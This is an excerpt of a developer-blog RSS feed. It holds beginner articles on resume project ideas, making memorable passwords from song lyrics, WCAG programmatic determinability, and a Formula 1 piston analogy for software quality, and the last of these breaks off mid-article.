      <category>nextjs</category>
      <category>javascript</category>
    </item>
    <item>
      <title>Some projects to build your resume!</title>
      <author>Unnati Bamania</author>
      <pubDate>Mon, 18 Jan 2021 13:14:43 +0000</pubDate>
      <link>https://dev.to/commentme/some-projects-to-build-your-resume-2leg</link>
      <guid>https://dev.to/commentme/some-projects-to-build-your-resume-2leg</guid>
      <description>&lt;p&gt;Projects are the identity of every web developer. Every web developer must build some projects which should be there on resume so that the resume can stand out. Here are some projects that I've mentioned which can help you build your resume and will definitely get attracted to any company. Along with the projects I've also mentioned the features from basic to advanced which can impress any interviewer or company. So ensure that you've these projects  listed on your portfolio using the tech stack you're most comfortable with.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#1-your-portfolio-website" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;1) Your portfolio website&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;This is best representation of your skills and designing sense. Make sure that the design you choose or build is attractive, unique and eye catchy. Your portfolio must contain some tricky and amazing animations. If possible you can also make a toggleable light and dark scheme types template.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#features" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Features&lt;/strong&gt;
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Swiper&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Particlejs&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Freepic &amp;amp; vectorstock&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Some CSS animations for card and button&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Some animation links.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://youtu.be/EZqhWu8GJ6U"&gt;Card animation&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://youtu.be/8b2mTq0Xrtw"&gt;Card animation&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://youtu.be/Q22Tli-D4mw"&gt;Card animation&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://youtu.be/cH0TC9gWiAg"&gt;Button animation&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://youtu.be/CMgl_etzlTI"&gt;Button animation&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://youtu.be/TawH-AqHTXc"&gt;Parallax Effect&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.codeinwp.com/blog/best-javascript-animation-libraries/"&gt;JS animation libraries&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=sN93DRYkCO8"&gt;check this&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--N7jBpBNA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/yhjr9bw4ed7kccnt9fp4.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--N7jBpBNA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/yhjr9bw4ed7kccnt9fp4.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--OSRf-ASb--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/903pttez8ohvjrdm0q8q.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--OSRf-ASb--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/903pttez8ohvjrdm0q8q.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#2-blog-page" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;2) Blog Page&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;Blog page can be one of useful projects to develop your skills and a good beginner-intermediate project. You can also host it as your own blog page or convert it to a forum.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#features" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Features&lt;/strong&gt;:
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Authentication &lt;/li&gt;
&lt;li&gt;Google or FB Oauth&lt;/li&gt;
&lt;li&gt;Rich text editor for content&lt;/li&gt;
&lt;li&gt;Post can be either text or photo or both&lt;/li&gt;
&lt;li&gt;Multiple image upload&lt;/li&gt;
&lt;li&gt;Upvote, downvote, comment on the post&lt;/li&gt;
&lt;li&gt;Save posts which we want to&lt;/li&gt;
&lt;li&gt;Like, edit, delete comment&lt;/li&gt;
&lt;li&gt;Report facility, not very complex, if that post has more than x reports then delete it.&lt;/li&gt;
&lt;li&gt;Follow unfollow user&lt;/li&gt;
&lt;li&gt;Add tags and posts under them &lt;/li&gt;
&lt;li&gt;Sort posts according to trends&lt;/li&gt;
&lt;li&gt;Search bar with query params&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--RDGdCddv--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/6z6aqtqbx45vp9hb4hgy.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--RDGdCddv--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/6z6aqtqbx45vp9hb4hgy.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#3-ecommerce" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;3) Ecommerce&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;Ecommerce is the classic example which give developers a chance to build mini amazon. If someone wants to try online payment system then this is the best platform to do so. Along with that there are a lot of features which can implemented.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#features" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Features:&lt;/strong&gt;
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Authentication&lt;/li&gt;
&lt;li&gt;Email verification or phone number verification&lt;/li&gt;
&lt;li&gt;Authentication should contain roles admin, seller, buyer&lt;/li&gt;
&lt;li&gt;Forgot password&lt;/li&gt;
&lt;li&gt;Admin panel to keep watch on app&lt;/li&gt;
&lt;li&gt;Buyer can add, delete, update products&lt;/li&gt;
&lt;li&gt;Images of product display using light box&lt;/li&gt;
&lt;li&gt;In stock/ out of stock feature&lt;/li&gt;
&lt;li&gt;Generate user address using an API with the help of password entered by user&lt;/li&gt;
&lt;li&gt;Discount feature&lt;/li&gt;
&lt;li&gt;Add, remove from cart &lt;/li&gt;
&lt;li&gt;History of user orders&lt;/li&gt;
&lt;li&gt;Check while adding if out of stock or not&lt;/li&gt;
&lt;li&gt;Payment option online/ offline&lt;/li&gt;
&lt;li&gt;Filtering options on basis of price and other attributes&lt;/li&gt;
&lt;li&gt;Rating item only if buyer buys it&lt;/li&gt;
&lt;li&gt;Simple and appealing UI&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://www.udemy.com/course/mern-ecommerce/"&gt;Check this&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--_8tKWSjr--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/cvh1sar62ue2w7om8jp2.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--_8tKWSjr--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/cvh1sar62ue2w7om8jp2.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#4-social-media" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;4) Social Media&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;One of the popular project for resume. Its one of the favorite for most of the developers. It will have most the features and application that a web developer needs to implement. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#features" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Features&lt;/strong&gt;
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Very attractive and simple UI&lt;/li&gt;
&lt;li&gt;Authentication using email &amp;amp; oauth&lt;/li&gt;
&lt;li&gt;Email verification &lt;/li&gt;
&lt;li&gt;Forgot password &lt;/li&gt;
&lt;li&gt;CRUD operations on a post&lt;/li&gt;
&lt;li&gt;Saving post&lt;/li&gt;
&lt;li&gt;Like &amp;amp; comment on post&lt;/li&gt;
&lt;li&gt;User can like the comment&lt;/li&gt;
&lt;li&gt;Report some post, comment or user&lt;/li&gt;
&lt;li&gt;Follow unfollow user&lt;/li&gt;
&lt;li&gt;Make account private or public&lt;/li&gt;
&lt;li&gt;Chat application using socket.io&lt;/li&gt;
&lt;li&gt;Filtering posts based on likes, comments&lt;/li&gt;
&lt;li&gt;Adding some new feature if possible &lt;/li&gt;
&lt;li&gt;hashtag implementation&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://www.instaclone.net/login"&gt;check this&lt;/a&gt;&lt;br&gt;
&lt;a href="https://github.com/Sandermoen/instaclone"&gt;code for the above app&lt;/a&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--6MigNtAL--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/0nyp6jhj77s1mjvr4l0j.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--6MigNtAL--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/0nyp6jhj77s1mjvr4l0j.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#5-real-estate" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;5) Real Estate&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;If you are very curious to implement something related to maps then this project is for you. Every web developer must try this.&lt;br&gt;
You can take inspiration from &lt;a href="https://housing.com/"&gt;Housing.com&lt;/a&gt; and &lt;a href="https://www.magicbricks.com/"&gt;magicbricks.com&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#features" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Features&lt;/strong&gt;
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Authentication with all above mentioned features&lt;/li&gt;
&lt;li&gt;Dealer can add property and location as well&lt;/li&gt;
&lt;li&gt;You can use google maps, location and other APIs for this.&lt;/li&gt;
&lt;li&gt;Adding property should contain all the features&lt;/li&gt;
&lt;li&gt;If possible can add a short video feature&lt;/li&gt;
&lt;li&gt;Pagination for displaying properties&lt;/li&gt;
&lt;li&gt;For user, authentication will be same as mentioned above with verification&lt;/li&gt;
&lt;li&gt;Advanced filtering and sorting for user&lt;/li&gt;
&lt;li&gt;Saving the property&lt;/li&gt;
&lt;li&gt;Searching advanced filter or google maps or simply by entering location&lt;/li&gt;
&lt;li&gt;Chat application using socket.io&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--fByi7nMX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/e6bq655lgss9tcrcxnvz.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--fByi7nMX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/e6bq655lgss9tcrcxnvz.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#some-other-projects" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Some other projects:&lt;/strong&gt;
&lt;/h1&gt;

&lt;h3&gt;
  &lt;a href="#resume-builder-app" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Resume builder app&lt;/strong&gt;
&lt;/h3&gt;

&lt;p&gt;You can make a web application which can make resume using templates. Build your own custom template. Some can be paid some for free. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#elearning-platform" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;E-Learning Platform&lt;/strong&gt;
&lt;/h3&gt;

&lt;p&gt;This is also one of the coolest projects to make your resume shine. You can add video lectures as an instructor. Make courses either paid or for free. You can use Amazon S3 cloud to store video. Use a heat map to target the progress of students who enroll in your course.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#simple-chat-application" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Simple chat application&lt;/strong&gt;
&lt;/h3&gt;

&lt;p&gt;If you want the basic and best implementation of socket.io then this is what you must build. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#web-games" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Web games&lt;/strong&gt;
&lt;/h3&gt;

&lt;p&gt;You can build various games as web application. &lt;br&gt;
One of the classic example is &lt;strong&gt;Doodle Cricket&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://doodlecricket.github.io/"&gt;Doodle cricket&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#reminder-app" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Reminder app&lt;/strong&gt;
&lt;/h3&gt;

&lt;p&gt;This app is very useful personal app. Specially for ones who're really forgetful. Setting reminder of any task at particular time.&lt;/p&gt;

&lt;p&gt;There are a lot of other projects. Build something unique of your own and that will give you intense happiness and satisfaction. Try new stuff. May be it can lead to a new and successful start up or fetch you a tag of pro developer. &lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--60-FjDXW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/84zt6id8j5hahxc5jip1.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--60-FjDXW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/84zt6id8j5hahxc5jip1.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

</description>
      <category>projectbenatar</category>
      <category>javascript</category>
      <category>webdev</category>
      <category>react</category>
    </item>
    <item>
      <title>How to create a secure password that you can remember</title>
      <author>Jorge Alvarez</author>
      <pubDate>Mon, 18 Jan 2021 11:47:00 +0000</pubDate>
      <link>https://dev.to/jorgealvarez/how-to-create-a-secure-password-that-you-can-remember-74e</link>
      <guid>https://dev.to/jorgealvarez/how-to-create-a-secure-password-that-you-can-remember-74e</guid>
      <description>&lt;p&gt;It's the eternal struggle, creating a strong password that is hard to crack yet easy to remember.&lt;/p&gt;

&lt;p&gt;We are usually forced to use random letters uppercase and downcase, numbers and symbols and the password should be at least 8 characters long. &lt;/p&gt;

&lt;p&gt;All of that is very good for security but very bad for our brains.  If you try to remember: &lt;em&gt;HP2Epzo&amp;amp;BTPuyQV&lt;/em&gt; chances are that you will end up writing it down on a piece of paper.  &lt;/p&gt;

&lt;p&gt;So here is the trick I use to generate passwords that are easy to memorize.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#use-letters-from-a-sentence" class="anchor"&gt;
  &lt;/a&gt;
  Use letters from a sentence
&lt;/h2&gt;

&lt;p&gt;It has the perfect balance between security and rememberability.&lt;/p&gt;

&lt;p&gt;Think of a sentence that you remember from a movie or from a song that you like and then use the first letter of each word to create the password. &lt;/p&gt;

&lt;p&gt;To add an extra level of security you can:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Use the last letter from each word.&lt;/li&gt;
&lt;li&gt;Alternate between the first and the last word.&lt;/li&gt;
&lt;li&gt;Substitute one letter with a symbol like: # $ % &amp;amp; * . ,&lt;/li&gt;
&lt;li&gt;Add numbers to the sentence if there are none.&lt;/li&gt;
&lt;li&gt;Think of a song you don't like yet you know the lyrics instead of one that you like.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;... be creative.&lt;/p&gt;

&lt;p&gt;These are a couple of examples using Iron Maiden songs.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Fly on you way like an eagle, fly as high as the sun.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The resulting password is: &lt;em&gt;foywlaefahats&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Let's improve it a bit:&lt;/p&gt;

&lt;p&gt;With an ampersand to join the two sentences: &lt;em&gt;foywlae&amp;amp;fahats&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Adding the year that the album was released: &lt;em&gt;foywlae&amp;amp;fahats1983&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Another example:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Oh Well, wherever, wherever you are, Iron Maiden's gonna get you, no matter how far.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The resulting password is: &lt;em&gt;owwwyaimiggynmhf&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;That's a very good password by itself but we can spice it up.&lt;/p&gt;

&lt;p&gt;Put Iron Maiden in uppercase: &lt;em&gt;owwwyaIMiggynmhf&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Add some numbers and symbols. I'm adding the year that the album was released and changing the first O with an asterisk.&lt;/p&gt;

&lt;p&gt;The resulting password is: &lt;em&gt;1980*wwwyaIMiggynmhf&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#summary" class="anchor"&gt;
  &lt;/a&gt;
  Summary
&lt;/h2&gt;

&lt;p&gt;As you can see generating secure passwords that are easy to remember is not as hard as it may seems if you are creative.&lt;/p&gt;

&lt;p&gt;Anyway what I would recommend you is to use a password manager if you can. Let them generate the passwords for you.&lt;/p&gt;

&lt;p&gt;But even a password manager needs a password to open it and also there are other situations like starting a session in your computer, that requires you to enter a password.&lt;/p&gt;

&lt;p&gt;With the help of your favorite movie/song and a bit of creativity you can create good passwords that are hard to crack and yet rememberable. &lt;/p&gt;

</description>
      <category>security</category>
      <category>developers</category>
      <category>webdev</category>
      <category>beginners</category>
    </item>
    <item>
      <title>What is Programmatic Determinability?</title>
      <author>Max Antonucci</author>
      <pubDate>Mon, 18 Jan 2021 11:20:57 +0000</pubDate>
      <link>https://dev.to/maxwell_dev/what-is-programmatic-determinability-31mc</link>
      <guid>https://dev.to/maxwell_dev/what-is-programmatic-determinability-31mc</guid>
      <description>&lt;p&gt;The phrase "programmatic determinability" appears a lot in the Web Content and Accessibility Guidelines (WCAG). It's also the kind of phrase that could make you sound smart or conceited, depending on how you use it. For these two &lt;em&gt;very important&lt;/em&gt; reasons, I wanted to figure it out.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.w3.org/TR/WCAG21/#dfn-programmatically-determinable"&gt;The official definition of "programmatically determined"&lt;/a&gt; kind of helped, but only kind of.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Determined by software from author-supplied data provided in a way that different user agents, including assistive technologies, can extract and present this information to users in different modalities&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This is a bit...dense. So I want to unpack it a bit.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#a-conversation-between-users-and-websites" class="anchor"&gt;
  &lt;/a&gt;
  A Conversation Between Users and websites
&lt;/h2&gt;

&lt;p&gt;The most succinct definition I can think of &lt;strong&gt;programmatic determinability stops misunderstandings between users and websites.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Sometimes you get into arguments with people who refuse to say why they're upset. No matter how many questions you ask, they only give variations of "I'm upset and you should already know why." It's impossible to reach any kind of agreement or resolution, and most likely you storm off on them with less-than-pleasant thoughts.&lt;/p&gt;

&lt;p&gt;A better scenario is you meet someone upset, and when you ask why, they say they're upset a store no longer sells their favorite cheesecake. You probably can't fix the underlying issue, but now you can do more helpful things like:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Share a similar experience to show them they're not alone&lt;/li&gt;
&lt;li&gt;Offer to get some cheesecake from a new place so they see there are still options out there&lt;/li&gt;
&lt;li&gt;Join them in their rage so they blow off steam by smashing cheesecake cardboard cutouts you coincidentally have lying around&lt;/li&gt;
&lt;li&gt;Offer use of a time machine to go back to when it was still sold so they can have it one last time and bid their cheesecake a fond farewell. Then the clouds part, the light shines through, and they can take another step forward in life as the credits roll.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The first fruitless, frustrating argument version is a website without programmatic determinability.&lt;/p&gt;

&lt;p&gt;Your website (the angry friend) isn't giving enough information to users using assistive technology (the frustrated friend). The user asks but gets nothing, doesn't know what to do next, and leaves in a huff.&lt;/p&gt;

&lt;p&gt;Want to avoid that scenario? &lt;strong&gt;That website needs that info in a coded format the browser can understand. Then the browser can share it and the two friends, user and website, can finally reconcile. This is programmatic determinability.&lt;/strong&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#share-obvious-info-with-users" class="anchor"&gt;
  &lt;/a&gt;
  Share "Obvious" Info with Users
&lt;/h2&gt;

&lt;p&gt;Here's a specific example: say an English-speaking user visits a website written in a foreign language. They know it has information they need to read but can't understand it. If the computer could talk, their interaction could go like this:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;User:&lt;/strong&gt; I can't understand what you're saying, webpage. What language are you in?&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Webpage:&lt;/strong&gt; How are you not able to understand me? Everyone else can.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;User:&lt;/strong&gt; Well, I can't. Do you know English?&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Webpage:&lt;/strong&gt; What's English?&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;User:&lt;/strong&gt; How do you not know that?!&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Webpage:&lt;/strong&gt; I don't know, you should just speak my language.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It goes back and forth like this for a while until the user quits from frustration. They tell all their friends how uncooperative the site was and its reputation suffers and dies on a neglected 404 page.&lt;/p&gt;

&lt;p&gt;The site in question forgot the &lt;code&gt;lang&lt;/code&gt; attribute on its &lt;code&gt;html&lt;/code&gt; tag. Without that, the website couldn't tell the user it was written in Italian. It can't share the info that would end this fight between user and website since it isn't programmatically determinable.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;lang&lt;/code&gt; attribute is the coded way the browser can understand what the language is. When it's included, the exchange may go like this.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;User:&lt;/strong&gt; I can't understand what you're saying, webpage. What language are you in?&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Webpage:&lt;/strong&gt; I'm written in Italian. Most of my users read that.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;User:&lt;/strong&gt; I get why you'd think that, but I can only read English. Do you have any translation options?&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Webpage:&lt;/strong&gt; I don't think so, but something like Google Translate can help. When I tell it my language, it'll do a rough translation to English.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;User:&lt;/strong&gt; That'll work for now. Thanks!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now the relationship is saved, the user isn't lost, and they can go out for cheesecake together later!&lt;/p&gt;

&lt;p&gt;Many accessibility issues can be boiled down to this kind of argument between users and inaccessible webpages that don't communicate well.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;It seems obvious where the navigation, sidebars, and main content are located in your layout. But some people won't see the layout. So you should share those relationships with roles or semantic markup.&lt;/li&gt;
&lt;li&gt;It seems obvious what's being shown on an image. But some people won't see the images. So you should share descriptions with &lt;code&gt;alt&lt;/code&gt; tags.&lt;/li&gt;
&lt;li&gt;It seems obvious what you're alerting users to with brightly-colored banners. But some people won't see those bright colors, or see the page at all. So you should share how important they are through explicit text, and ARIA live regions or alert roles.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These take even more forms - knowing how to solve them for as many users and websites as possible is part of the never-ending accessibility journey. Programmatic determinability is only one part of it, albeit one of the most important ones.&lt;/p&gt;

&lt;p&gt;Keep it in mind, and your users will never miss out on cheesecake with your website again.&lt;/p&gt;

</description>
      <category>a11y</category>
      <category>beginners</category>
    </item>
    <item>
      <title>Tolerances: How Formula 1 pistons can teach us to be better developers</title>
      <author>Douglas Parsons</author>
      <pubDate>Mon, 18 Jan 2021 10:37:00 +0000</pubDate>
      <link>https://dev.to/dglsparsons/tolerances-how-formula-1-pistons-can-teach-us-to-be-better-developers-18fb</link>
      <guid>https://dev.to/dglsparsons/tolerances-how-formula-1-pistons-can-teach-us-to-be-better-developers-18fb</guid>
      <description>&lt;p&gt;Recently, while procrastinating from work, I found myself watching a youtube video on &lt;a href="https://www.youtube.com/watch?v=lCEKJxHiEIM"&gt;Formula 1 pistons&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This video seeks to answer the question: why does a Formula 1 car piston cost around 1,000 times the amount of a typical road car (£50,000 vs £50), despite appearing very similar and serving the same purpose?&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--0b6tEQe_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dgls.dev/img/remote/pistons.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--0b6tEQe_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dgls.dev/img/remote/pistons.jpg" alt="Whispering"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Left: piston from an American muscle car. Right: piston from a formula 1 car.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;So, what does this teach us about programming, and how to be a better developer?&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#the-cost-of-immaculate-tolerances" class="anchor"&gt;
  &lt;/a&gt;
  The cost of immaculate tolerances 💰
&lt;/h2&gt;

&lt;p&gt;Manufacturing a car piston is a game of playing with tolerances.&lt;/p&gt;

&lt;p&gt;The piston itself has to fit into a cylinder block snugly, with a small gap around the sides to allow it to move freely. If the gap between a piston and the cylinder is too big, then burning fuel can escape, and the piston is far less efficient. If the gap is too small, then the piston can seize up, blocking the engine completely.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--uGA3FBrf--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dgls.dev/img/remote/piston-cycle.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--uGA3FBrf--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dgls.dev/img/remote/piston-cycle.jpg" alt="Piston Cycle"&gt;&lt;/a&gt;&lt;em&gt;The process a car piston goes through in a single cycle&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;This adds some serious complexity for building these parts. Not only do they have to be designed to an incredible specification, but the margin for error when manufacturing these parts is so small that they require specialised machinery and special processes to make sure they are fit for purpose.&lt;/p&gt;

&lt;p&gt;Rather than immaculate tolerances, what if we wanted to be able to guarantee the quality of code we write as programmers? Imagine if a single bug in your code would be a catastrophic failure or even a risk to life. Would that change the way you write code? Would it change the way you review and test code? And how do you think that would affect the speed at which you develop?&lt;/p&gt;

&lt;p&gt;No doubt development would be much slower. Just like the creation of pistons for Formula 1, the process would have to become far more thorough. You would need specific tools and processes to guarantee the right results. You would have to change the way you approach writing software to ensure it behaved exactly as you wanted in every possible situation. And, no doubt, the overall cost of developing software would become much greater as a result of these changes.&lt;/p&gt;

&lt;p&gt;When we write software, we have to bear this situation in mind. It’s easy to claim that everything should be of the highest possible quality, but there is a cost for achieving that. Instead, the bar for quality needs to appropriate for the task at hand. Set your tolerances too small, and development becomes slow and expensive. Set them too low, and you end up with inefficient results.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#regular-oiling-and-refactoring" class="anchor"&gt;
  &lt;/a&gt;
  Regular oiling and refactoring 🛢️
&lt;/h2&gt;

&lt;p&gt;In a typical road car, pistons require a bit of help to slide up and down inside their cylinder block: metal doesn’t slide particularly well over other metal, so a layer of oil makes the whole process much easier. In new cars, this oil is a very thin, watery liquid thanks to a solid manufacturing process of car engines. In classic cars, oil can be thick, black gunge - the difference being the gap between the piston and the cylinder block is much larger, so the oil needs to be much thicker to work across the gap. As Formula 1 cars have such minuscule tolerances, their pistons require no oil at all.&lt;/p&gt;

&lt;p&gt;Now, imagine oiling a car as being like refactoring code.&lt;/p&gt;

